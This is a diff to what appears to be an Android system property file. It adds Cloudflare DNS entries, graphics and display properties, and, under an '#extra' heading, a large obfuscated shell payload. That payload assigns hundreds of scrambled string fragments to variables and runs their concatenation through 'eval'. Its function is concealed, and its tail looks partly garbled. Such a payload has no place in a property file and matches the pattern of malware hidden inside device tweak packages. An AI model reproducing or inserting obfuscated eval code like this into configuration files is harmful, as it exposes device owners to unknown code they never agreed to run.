@@ -27,3 +27,35 @@ persist.ims.disableADBLogs=1
 persist.ims.disableDebugLogs=1
 persist.ims.disableIMSLogs=1
 persist.ims.disableQXDMLogs=1
+
+#Best_DNS
+net.dns1= 1.1.1.1
+net.dns2= 1.0.0.1
+net.rmnet0.dns1= 1.1.1.1
+net.rmnet0.dns2= 1.0.0.1
+net.ppp0.dns1= 1.1.1.1
+net.ppp0.dns2= 1.0.0.1
+net.wlan0.dns1= 1.1.1.1
+net.wlan0.dns2= 1.0.0.1
+net.eth0.dns1= 1.1.1.1
+net.eth0.dns2= 1.0.0.1
+net.gprs.dns1= 1.1.1.1
+net.gprs.dns2= 1.0.0.1
+
+#Internal_problem_fix
+ro.treble.enabled=false
+ro.config.hw_quickpoweron=true
+
+# Graphics Drivers prop file
+ro.adreno.opengl=V@550.0
+ro.adreno.edition=OpenGL and Vulkan
+ro.adreno.vulkan=V750
+
+# Display Graphics
+ro.debug.sf.hw=1
+ro.vendor.gralloc.enable_fb_ubwc=1
+
+#extra
+z="
+";roBz='z$EI';uNBz='dkz=';vfBz='mIz$';bnz=''\'';DS';ayBz='$eYz';sjz=''\'';JV';afBz='z$RI';uBz='Poz=';Axz='gIz=';vWBz='uJz'\''';RGBz='LI'\'';';EYz='Lhz=';EqBz='z$ZR';oXBz='$BBz';pGBz='='\''PD';pvz='\'\'';k';qbBz='$GFz';YBBz='ZUz=';ROz=''\''z$T';oTBz='K'\'';Y';plBz='qNz$';kBBz='$oNz';yjBz='$NMz';tBCz='z$ia';wvz='0'\''\'\''';wFz='z='\''E';sICz='wgz$';FMCz='Ikz$';QVz='WNz=';KsBz='z$NT';PHBz='Zfz=';lICz='pgz$';nnBz='z$bP';Cyz=''\'''\'';h';mECz='Cdz$';TZBz='Bz$o';XACz='z$WZ';dYBz='$xBz';cEz='z$R'\''';dCz=';flz';SOCz='Vmz$';aMCz='dkz$';LkBz='XEz$';fgz=';mKz';bfz=';kI'\''';VdBz='$ZGz';YICz='cgz$';KTz=';QRz';hFz=''\'';yF';poz=''\''$NH';IGBz=''\''z$E';IZBz='hz$b';MPBz=''\'';Uz';jPBz=''\'';kl';jACz='vEz$';wsz=';Sfz';NYBz='z$eB';eKz=''\'''\'';M';Paz='Iz$z';xz=''\'''\'''\'';';faBz='z$vD';FFz=';RN'\''';roz=''\'';NQ';cGz='nUz=';aiBz='wKz$';lDCz='z$Jc';ONz='QCz'\''';FwBz='bWz$';RbBz='hEz$';nOz=';fUz';HVz=''\'';aD';wXBz='Dz$L';TKCz='Xiz$';cSz=''\'';D'\''';DSz='ait'\''';kGz='UGz=';OEBz=''\'''\'' "';PxBz='z$dX';RfBz='z$KI';BlBz='Xz$g';sBCz='z$ha';idz=';fTz';Sjz='='\''wH';uSz='z='\''m';tjBz='z$IM';ZuBz='Vz$I';HOCz='Kmz$';DJz='$JHz';Ixz='='\''Cz';TjBz='Bz$k';LKBz='$WIz';Dcz=''\'';vn';RKz=''\'''\'';J';RDCz='Mz$r';rIBz=''\''$uL';CQBz=';tH'\''';XDCz='$wbz';qdz='tJz'\''';GQCz='Joz$';DdBz='$kDz';ZbBz='Ez$q';ptBz='Uz$f';WLBz=''\'';ii';kHz='Zz='\''';RVz=''\''JCz';XBCz='Cz$P';mXBz='z$yz';fECz='IKz$';vUz='nz='\''';vTz='H'\'';m';rEz='Mz='\''';ZPz='kQz=';Kpz='Eiz=';QSCz='Tqz$';GKBz='yz'\''\';lCCz='z$Rb';WqBz='Rz$E';IOCz='Lmz$';fCCz='z$Ob';cACz='z$bZ';ARCz='Dpz$';Xpz='FLz'\''';YWBz=''\'';Sk';WoBz='$FQz';ZyBz='$dYz';Rgz='='\''$f';KWz=''\''sGz';BHz=''\'';gD';hsBz='z$hT';RICz='Vgz$';khBz='OKz$';yNz=';Jiz';uLCz='xjz$';pDBz=''\'';lI';fBCz='Vaz$';vsz=''\'';bX';JOBz='Cz$z';Cmz='fDz=';EvBz='z$fV';iqBz='Sz$p';rwz='B'\'';d';sxBz='$CYz';sQBz='Raz=';JDCz='z$kb';AKBz='fF'\'';';cFBz='z'\'';m';MLBz=''\'''\''$s';RVBz='$EEz';sMBz='lKz=';nECz='Ddz$';Vlz=''\'';bp';Kqz='$mNz';ghBz='$LKz';enz='$'\'';J';nABz='DDz'\''';KGz='QZz=';MkBz='YMz$';Nbz=';eK'\''';Hsz='Rkz=';lpz='p'\''\'\''';EUz=''\'';BF';jpz=';VCz';fABz='DXz=';oz='uTz=';juz='b'\''\'\''';MRz=';GB'\''';EMCz='Hkz$';ujz=''\'';yM';aSBz=''\'';eJ';qEz='I'\'';V';PwBz='z$jW';jgz='Uiz=';iyz='amp'\''';ENCz='Hlz$';iIz=''\'''\'';u';lrBz='Sz$v';mwz=''\''vBz';odz='$vJz';AQCz='Doz$';VBBz=''\'';pl';WACz='z$VZ';mPCz='pnz$';RWz=';FHz';DNCz='Glz$';riz=';XB'\''';SBz=''\'''\''\'\''';pICz='tgz$';ogBz='wDz$';Kgz=';HWz';AZBz='$TCz';ZRCz='cpz$';mSCz='pqz$';DFCz='Qdz$';iWBz=''\'';fK';OiBz='z$mB';Fbz=''\'';AH';ctz=';Ioz';jrz=''\'';Q'\''';llBz='mNz$';dQBz='tOz=';Zfz=''\'''\'';B';FFBz=''\'';oP';kMz=''\'';Kl';hHCz='lfz$';xcBz='FGz$';BFBz='i'\'';f';Erz=''\'''\''om';xsBz='uTz$';Ulz='IKz=';Ikz=''\'';Ya';XHz=''\'''\'';N';ghz=''\''z;FgBz='tIz$';
+eval "$Az$z$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Cz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$Wz$lz$mz$Wz$nz$oz$pz$Dz$qz$rz$Wz$sz$tz$uz$Dz$vz$mz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$Wz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$wz$VBz$WBz$Yz$XBz$YBz$ZBz$aBz$bBz$cBz$Wz$dBz$eBz$SBz$fBz$gBz$Cz$Dz$hBz$iBz$jBz$kBz$JBz$lBz$mBz$nBz$oBz$pBz$qBz$UBz$rBz$sBz$Cz$Dz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$Cz$Lz$BCz$CCz$DCz$ECz$FCz$GCz$HCz$ICz$JCz$KCz$LCz$MCz$NCz$xz$OCz$PCz$Dz$QCz$RCz$SCz$TCz$Yz$UCz$JBz$Lz$VCz$WCz$XCz$YCz$ZCz$aCz$HBz$bCz$cCz$dCz$eCz$fCz$gCz$hCz$Wz$iCz$RCz$Wz$jCz$kCz$lCz$mCz$nCz$oCz$UBz$pCz$qCz$rCz$sCz$tCz$uCz$vCz$wCz$xCz$yCz$ADz$BDz$CDz$ez$DDz$EDz$FDz$GDz$HDz$IDz$rz$Wz$JDz$KDz$LDz$MDz$NDz$ODz$PDz$QDz$Wz$RDz$SDz$TDz$UDz$NDz$wz$VDz$WDz$XDz$YDz$ZDz$aDz$bDz$HBz$cDz$SBz$dDz$mBz$eDz$fDz$gDz$hDz$iDz$jDz$kDz$WCz$lDz$mDz$nDz$oDz$pDz$Wz$qDz$rDz$Yz$UCz$sDz$tDz$Cz$uDz$YDz$vDz$wDz$Wz$xDz$RCz$yDz$AEz$BEz$Dz$CEz$DEz$EEz$FEz$GEz$HEz$IEz$JEz$KEz$LEz$SBz$MEz$NEz$Cz$Dz$OEz$PEz$QEz$REz$vCz$SEz$TEz$RCz$UEz$VEz$WEz$XEz$YEz$SBz$ZEz$aEz$bEz$cEz$dEz$eEz$MBz$fEz$gEz$Wz$hEz$Cz$Dz$iEz$jEz$kEz$lEz$mEz$nEz$Lz$oEz$Yz$pEz$qEz$rEz$sEz$tEz$uEz$vEz$wEz$Yz$xEz$yEz$AFz$BFz$CFz$Cz$DFz$Wz$EFz$fDz$Wz$FFz$GFz$HFz$Dz$IFz$GCz$JFz$KFz$Yz$LFz$MFz$ZBz$NFz$OFz$RCz$PFz$QFz$RFz$SFz$TFz$NDz$UFz$VFz$QDz$WFz$XFz$YFz$HCz$ZFz$CBz$aFz$bFz$RCz$cFz$dFz$WCz$eFz$fFz$SBz$gFz$hFz$iFz$jFz$xz$kFz$lFz$Wz$mFz$nFz$bz$oFz$Yz$pFz$Wz$qFz$Cz$rFz$sFz$XBz$tFz$uFz$vFz$wFz$xFz$yFz$AGz$BGz$CGz$lCz$DGz$EGz$FGz$GGz$HGz$IGz$JGz$KGz$LGz$MGz$QBz$HCz$NGz$OGz$PGz$QGz$RGz$SBz$SGz$TGz$RCz$UGz$VGz$WGz$YDz$XGz$YGz$ZGz$aGz$Cz$Dz$bGz$cGz$dGz$eGz$fGz$gGz$hGz$MCz$xFz$iGz$jGz$KEz$kGz$YGz$lGz$Lz$mGz$XDz$MBz$nGz$pBz$oGz$jBz$HBz$Lz$pGz$qGz$rCz$rGz$sGz$tGz$Oz$uGz$vGz$wGz$xGz$yGz$AHz$SBz$BHz$CHz$RCz$DHz$EHz$FHz$Dz$GHz$CBz$HHz$IHz$mz$JHz$KHz$WCz$LHz$MHz$jBz$Wz$NHz$OHz$Yz$PHz$Vz$QHz$Cz$rFz$rCz$RHz$SHz$THz$CBz$Wz$Wz$UHz$VHz$WHz$XHz$YHz$ZHz$Wz$aHz$bHz$pBz$cHz$dHz$eHz$fHz$RCz$gHz$hHz$iHz$Wz$jHz$kHz$lHz$mHz$nHz$oHz$KEz$pHz$HCz$qHz$xz$rHz$sHz$tHz$uHz$HCz$vHz$wHz$RFz$xHz$yHz$AIz$BIz$CIz$xz$DIz$EIz$FIz$GIz$HIz$wz$xz$IIz$JIz$KIz$DEz$wz$LIz$MIz$NIz$QGz$OIz$PIz$Dz$QIz$RIz$Wz$SIz$TIz$UIz$VIz$WIz$XIz$YIz$ZIz$WFz$aIz$FBz$Wz$bIz$cIz$Wz$dIz$eIz$fIz$gIz$hIz$YGz$iIz$jIz$GCz$kIz$lIz$mIz$XEz$nIz$oIz$tHz$pIz$qIz$rIz$wz$Wz$Wz$sIz$tIz$uIz$vIz$ez$wIz$xIz$yIz$rCz$AJz$BJz$CJz$Iz$DJz$EJz$FJz$GJz$HJz$IJz$Wz$JJz$xFz$Oz$Lz$KJz$Yz$UCz$LJz$MJz$GCz$HCz$NJz$OJz$PJz$QJz$RJz$GCz$SJz$TJz$UJz$iz$VJz$SBz$WJz$XJz$RCz$YJz$ZJz$Yz$aJz$Wz$bJz$Cz$Dz$cJz$dJz$HFz$eJz$fJz$Cz$gJz$ez$hJz$iJz$MFz$CBz$Wz$jJz$kJz$lJz$mJz$nJz$DCz$oJz$Lz$pJz$qJz$rJz$sJz$YGz$tJz$uJz$GCz$vJz$wJz$xJz$ez$yJz$AKz$BKz$fDz$CKz$DKz$ez$EKz$FKz$WCz$GKz$HKz$SBz$IKz$JKz$RCz$KKz$LKz$MKz$rCz$cz$NKz$Wz$OKz$GCz$PKz$QKz$Yz$RKz$SKz$QBz$TKz$Lz$UKz$VKz$WKz$XKz$YT$"
